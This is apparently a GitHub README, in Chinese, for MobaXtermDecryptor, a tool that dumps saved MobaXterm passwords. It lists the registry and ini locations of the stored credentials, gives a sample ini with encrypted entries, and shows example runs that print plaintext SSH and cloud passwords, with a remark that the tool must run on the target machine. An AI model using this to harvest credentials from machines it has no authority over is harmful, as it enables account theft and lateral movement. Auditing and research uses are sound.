## MobaXtermDecryptor

[![Author](https://img.shields.io/badge/author-h0ny-red.svg "Author")](https://github.com/h0ny "Author")
[![Visitors](https://visitor-badge.laobi.icu/badge?page_id=h0ny.MobaXtermDecryptor "Visitors")](https://github.com/h0ny/MobaXtermDecryptor "Visitors")
[![Stars](https://img.shields.io/github/stars/h0ny/MobaXtermDecryptor.svg?style=flat&label=Stars "Stars")](https://github.com/h0ny/MobaXtermDecryptor "Stars")
[![Downloads](https://img.shields.io/github/downloads/h0ny/MobaXtermDecryptor/total.svg)](https://github.com/h0ny/NacosExploit/releases)
![GitHub License](https://img.shields.io/github/license/h0ny/MobaXtermDecryptor)

### 介绍

一个简单的 MobaXterm 密码转储工具。

---

用户凭据存储的位置：

| Registry Path                                  | Registry Entry         | Portable MobaXterm.ini Section | Description                         |
| ---------------------------------------------- | ---------------------- | ------------------------------ | ----------------------------------- |
| HKEY_CURRENT_USER\Software\Mobatek\MobaXterm   | SessionP               | [Misc]                         | Entropy used in DPAPI               |
| HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\M | [UserName@MachineName] | [Sesspass]                     | Base64-encoded Master Password      |
| HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\P | [All Registry Entries] | [Passwords]                    | Passwords - Encrypted credentials   |
| HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\C | [All Registry Entries] | [Credentials]                  | Credentials - Encrypted credentials |

部分 MobaXterm.ini 内容示例：

```ini
[Misc]
PasswordsInRegistry=0
SessionP=656078197542
MPSetDate=4/14/2024
MPSetAccount=Administrator
MPSetComputer=WIN-KC7O8UA7U4Q

[Credentials]
cloud-user=root:hDkUY2nK

[Passwords]
mobauser@mobaserver=hnp+7YZCxO75h1e/w1tST2IvKHtWIIIRuKQ=

[Sesspass]
Administrator@WIN-KC7O8UA7U4Q=AQAAALK+kjnRao9Fp9ljPL2GpQIAAAAAAgAAAAAAEGYAAAABAAAgAAAA8eEio3ElndSDHvad+IUTeuDcxECIp6BRTcnl4WUO0hQAAAAADoAAAAACAAAgAAAApYkVRexqVUB0W2aggCLirnpVr7XXvG4zkThBB5Cc34RgAAAAtuRBDfbxi9Ws5Fp7D2DAV12a/7+ZAC4Y8s6LryB0AmG6eByh2+ScguKs0nKsXupoHtQrq1esdbOF+KA5ObYKv7e9Cmb3X86HX90sRyaqRoi0faQ4BwL2EVFP3CAqNfVCQAAAAOIiPQ/546VgLw5vn2ptgn/ELHzOiGWwA7v9ov3Z0/POZrPXW+1jtb2PeGCkWyH82PDjx5c0UyO4j7xw/UzrDYE=
```

### 使用方法

对于 MobaXterm 安装版本直接运行即可：

```
PS C:\> .\MobaXtermDecryptor.exe
[+] MobaXterm Installer Edition
[*] ----------------- Passwords -----------------
[*] Connection Name: mobauser@mobaserver
[*] Password:        324326moba126340pass359591

[*] Connection Name: ssh22:root@192.168.10.10
[*] Password:        admin123

[*] ----------------- Credentials -----------------
[*] Name:     cloud-user
[*] Username: ubuntu
[*] Password: 123456
```

对于 MobaXterm 便携版本需要指定 MobaXterm.ini 文件：

```
PS C:\> .\MobaXtermDecryptor.exe C:\Users\Administrator\Desktop\MobaXterm.ini
[+] MobaXterm Portable Edition
[*] ----------------- Passwords -----------------
[*] Connection Name: mobauser@mobaserver
[*] Password:        324326moba126340pass359591

[*] Connection Name: ssh22:root@192.168.10.10
[*] Password:        admin123

[*] ----------------- Credentials -----------------
[*] Name:     cloud-user
[*] Username: ubuntu
[*] Password: 123456
```

> 注意：对于便携版也需要在目标机器上运行，因为有进行 DPAPI 解密操作。

### 参考项目

- https://github.com/qwqdanchun/Pillager
- https://github.com/XMCyber/XMCredentialsDecryptor
- https://github.com/HyperSine/how-does-MobaXterm-encrypt-password
